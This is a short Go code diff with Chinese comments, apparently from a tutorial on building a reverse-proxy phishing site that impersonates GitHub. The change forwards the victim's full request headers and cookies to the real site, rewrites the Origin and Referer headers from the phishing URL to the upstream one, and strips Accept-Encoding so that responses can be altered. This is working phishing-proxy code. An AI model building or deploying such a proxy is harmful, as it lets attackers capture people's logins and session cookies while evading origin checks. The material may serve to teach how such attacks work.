@@ -60,9 +60,16 @@ func cloneRequest(r *http.Request) *http.Request {
 		panic(err)
 	}
 
-	// 把原請求的 cookie 複製到 req 的 cookie 裡面
-	// 這樣請求被發到 Github 時就會帶上 cookie
-	req.Header["Cookie"] = r.Header["Cookie"]
+	// 複製整個 request header
+	req.Header = r.Header
+
+	// 取代 header 中的 Origin, Referer 網址
+	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
+	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
+	req.Header.Set("Origin", origin)
+	req.Header.Set("Referer", referer)
+	// 直接把 Accept-Encoding 刪掉
+	req.Header.Del("Accept-Encoding")
 
 	return req
 }
